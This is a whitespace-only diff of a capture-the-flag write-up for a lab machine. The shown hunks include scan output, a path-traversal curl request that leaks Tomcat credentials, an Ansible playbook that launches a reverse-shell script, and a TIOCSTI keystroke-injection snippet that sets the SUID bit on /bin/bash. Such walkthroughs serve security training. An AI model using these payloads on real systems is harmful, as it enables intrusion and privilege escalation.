@@ -9,53 +9,53 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 6800 | HTTP    |
-| 8080 | HTTP    |
-| 8888 | HTTP    |
+| 22 | SSH |
+| 6800 | HTTP |
+| 8080 | HTTP |
+| 8888 | HTTP |
 
 ```
-PORT     STATE SERVICE         REASON  VERSION
-22/tcp   open  ssh             syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+PORT STATE SERVICE REASON VERSION
+22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
-|   3072 55:41:5a:65:e3:d8:c2:4f:59:a1:68:b6:79:8a:e3:fb (RSA)
+| 3072 55:41:5a:65:e3:d8:c2:4f:59:a1:68:b6:79:8a:e3:fb (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDzPMYVGNn9fk2sUO4qG8t3GP/3ztCkoIRFTSFwnaHtRTiIe8s3ulwJkAyTZHSmedBOMihmyWyEmA44uxY4kUZEiba8R+c7aWHjTvD04VcKWPgVg1URPWMTHyxUcwKGnoh8n6VwM283+/4f2g2GSj2pVbacoV3xfDo8L4PshyfHK7dEd2qnQv9Yge3p5Aw/1Q7w1eaMZnaoicgzDgjhvqrRcS/DRcp3Lwoz6fGQW2/vFxW7d5aisTslKxRPslTy/Vrgprb7I+D9kdGEFqW/DXDfZLo+4O0woecE6+qSYPbIAjvIao25MTR8xHOFR0sCtyVfehEXYxvJ0fsqBG4yp/y15eDT3MSYevdvhHH1ZLejV66zILbPqUhzFBuMW1U6PKvSNPiQdzlnIRpD8ZQN7KJI8Y6zlHgoh8iu7+PgcUQNixYrX1GhMCYwNGHQlLOLriVRzhScZV3ObH1V8+g8I2sc3WZ54G2XUqZX+pN3ugjN1L5mo8mht1m7ZME+W9if37U=
-|   256 79:8a:12:64:cc:5c:d2:b7:38:dd:4f:07:76:4f:92:e2 (ECDSA)
+| 256 79:8a:12:64:cc:5c:d2:b7:38:dd:4f:07:76:4f:92:e2 (ECDSA)
 | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJfVuy7uiXVmzWVPtY/BYF+RZF36ZR8rh7wxeZi7yeOdWd06henZf8z5rYfalc0YHr6kE3clVa0jq+pF64w/lso=
-|   256 ce:e2:28:01:5f:0f:6a:77:df:1e:0a:79:df:9a:54:47 (ED25519)
+| 256 ce:e2:28:01:5f:0f:6a:77:df:1e:0a:79:df:9a:54:47 (ED25519)
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHMk87a1jTdUzEWZNm/XtZKIto5reBlJr75kFdCKXscp
-6800/tcp open  http            syn-ack aria2 downloader JSON-RPC
+6800/tcp open http syn-ack aria2 downloader JSON-RPC
 | http-methods:
-|_  Supported Methods: OPTIONS
+|_ Supported Methods: OPTIONS
 |_http-title: Site doesn't have a title.
-8080/tcp open  http            syn-ack Apache Tomcat 8.5.93
+8080/tcp open http syn-ack Apache Tomcat 8.5.93
 |_http-favicon: Apache Tomcat
 | http-methods:
-|_  Supported Methods: GET HEAD POST
+|_ Supported Methods: GET HEAD POST
 |_http-open-proxy: Proxy might be redirecting requests
 |_http-title: Apache Tomcat/8.5.93
-8888/tcp open  sun-answerbook? syn-ack
+8888/tcp open sun-answerbook? syn-ack
 | fingerprint-strings:
-|   GetRequest, HTTPOptions:
-|     HTTP/1.1 200 OK
-|     Content-Type: text/html
-|     Date: Thu, 27 Mar 2025 17:12:41 GMT
-|     Connection: close
-|     <!doctype html>
-|     <html>
-|     <!-- {{{ head -->
-|     <head>
-|     <link rel="icon" href="../favicon.ico" />
-|     <meta charset="utf-8">
-|     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-|     <meta name="theme-color" content="#0A8476">
-|     <title ng-bind="$root.pageTitle">Aria2 WebUI</title>
-|     <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Lato:400,700">
-|     <link href="app.css" rel="stylesheet"><script type="text/javascript" src="vendor.js"></script><script type="text/javascript" src="app.js"></script></head>
-|     <!-- }}} -->
-|     <body ng-controller="MainCtrl" ng-cloak>
-|     <!-- {{{ Icons -->
+| GetRequest, HTTPOptions:
+| HTTP/1.1 200 OK
+| Content-Type: text/html
+| Date: Thu, 27 Mar 2025 17:12:41 GMT
+| Connection: close
+| <!doctype html>
+| <html>
+| <!-- {{{ head -->
+| <head>
+| <link rel="icon" href="../favicon.ico" />
+| <meta charset="utf-8">
+| <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+| <meta name="viewport" content="width=device-width, initial-scale=1.0">
+| <meta name="theme-color" content="#0A8476">
+| <title ng-bind="$root.pageTitle">Aria2 WebUI</title>
+| <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Lato:400,700">
+| <link href="app.css" rel="stylesheet"><script type="text/javascript" src="vendor.js"></script><script type="text/javascript" src="app.js"></script></head>
+| <!-- }}} -->
+| <body ng-controller="MainCtrl" ng-cloak>
+| <!-- {{{ Icons -->
 ```
 
 # RECONNAISSANCE
@@ -75,29 +75,29 @@ We got an apache tomcat `8.5.93` server, there's some directories I found by fuz
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.37.202:8080/FUZZ" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.37.202:8080/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Method : GET
+ :: URL : http://10.10.37.202:8080/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 335ms]
-examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 160ms]
-manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 161ms]
+docs [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 335ms]
+examples [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 160ms]
+manager [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 161ms]
 ```
 
 What about `8888`:
@@ -178,12 +178,12 @@ Now that we know we got LFI, we can try reading `tomcat` configuration files, fo
 curl --path-as-is "http://10.10.252.252:8888/../../../../../../../../opt/tomcat/conf/tomcat-users.xml"
 <?xml version="1.0" encoding="UTF-8"?>
 <tomcat-users xmlns="http://tomcat.apache.org/xml"
-              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
-              version="1.0">
+ xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+ xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+ version="1.0">
 
-  <role rolename="manager-script"/>
-  <user username="tomcat" password="OPx52k53D8OkTZpx4fr" roles="manager-script"/>
+ <role rolename="manager-script"/>
+ <user username="tomcat" password="OPx52k53D8OkTZpx4fr" roles="manager-script"/>
 
 </tomcat-users>
 ```
@@ -270,9 +270,9 @@ We can now create a `.yml` script with the following contents:
 
 ```yml
 - hosts: localhost
-  tasks:
-    - name: RShell
-      command: bash /tmp/wilbur.sh
+ tasks:
+ - name: RShell
+ command: bash /tmp/wilbur.sh
 ```
 
 
@@ -307,14 +307,14 @@ Nice, we can check these files in `wilbur` home:
 wilbur@Backtrack:/tmp$ ls -la /home/wilbur/
 total 28
 drwxrwx--- 3 wilbur wilbur 4096 Mar 27 18:25 .
-drwxr-xr-x 4 root   root   4096 Mar  9  2024 ..
+drwxr-xr-x 4 root root 4096 Mar 9 2024 ..
 drwxrwxr-x 3 wilbur wilbur 4096 Mar 27 18:25 .ansible
-lrwxrwxrwx 1 root   root      9 Mar  9  2024 .bash_history -> /dev/null
--rw-r--r-- 1 wilbur wilbur 3771 Mar  9  2024 .bashrc
--rw------- 1 wilbur wilbur   48 Mar  9  2024 .just_in_case.txt
-lrwxrwxrwx 1 root   root      9 Mar  9  2024 .mysql_history -> /dev/null
--rw-r--r-- 1 wilbur wilbur 1010 Mar  9  2024 .profile
--rw------- 1 wilbur wilbur  461 Mar  9  2024 from_orville.txt
+lrwxrwxrwx 1 root root 9 Mar 9 2024 .bash_history -> /dev/null
+-rw-r--r-- 1 wilbur wilbur 3771 Mar 9 2024 .bashrc
+-rw------- 1 wilbur wilbur 48 Mar 9 2024 .just_in_case.txt
+lrwxrwxrwx 1 root root 9 Mar 9 2024 .mysql_history -> /dev/null
+-rw-r--r-- 1 wilbur wilbur 1010 Mar 9 2024 .profile
+-rw------- 1 wilbur wilbur 461 Mar 9 2024 from_orville.txt
 ```
 
 Let's read those files:
@@ -340,17 +340,17 @@ With those credentials, we can do the following, based on the note, there must b
 
 ```
 wilbur@Backtrack:/tmp$ netstat -tuln | grep LISTEN
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
-tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
-tcp        0      0 0.0.0.0:6800            0.0.0.0:*               LISTEN
-tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN
-tcp6       0      0 :::22                   :::*                    LISTEN
-tcp6       0      0 :::8888                 :::*                    LISTEN
-tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN
-tcp6       0      0 :::8080                 :::*                    LISTEN
-tcp6       0      0 :::6800                 :::*                    LISTEN
+tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN
+tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN
+tcp 0 0 127.0.0.1:33060 0.0.0.0:* LISTEN
+tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN
+tcp 0 0 0.0.0.0:6800 0.0.0.0:* LISTEN
+tcp 0 0 127.0.0.1:80 0.0.0.0:* LISTEN
+tcp6 0 0 :::22 :::* LISTEN
+tcp6 0 0 :::8888 :::* LISTEN
+tcp6 0 0 127.0.0.1:8005 :::* LISTEN
+tcp6 0 0 :::8080 :::* LISTEN
+tcp6 0 0 :::6800 :::* LISTEN
 ```
 
 There we go, it's the one located at port `80`, with the credentials we've found, we can do port forwarding to access the resource in our machine:
@@ -501,7 +501,7 @@ import signal
 os.kill(os.getppid(), signal.SIGSTOP)
 
 for char in 'chmod +s /bin/bash\n':
-    fcntl.ioctl(0, termios.TIOCSTI, char)
+ fcntl.ioctl(0, termios.TIOCSTI, char)
 ```
 
 Since we are `orville`, we can modify the `.bashrc` file, after writing the script, we can do the following:
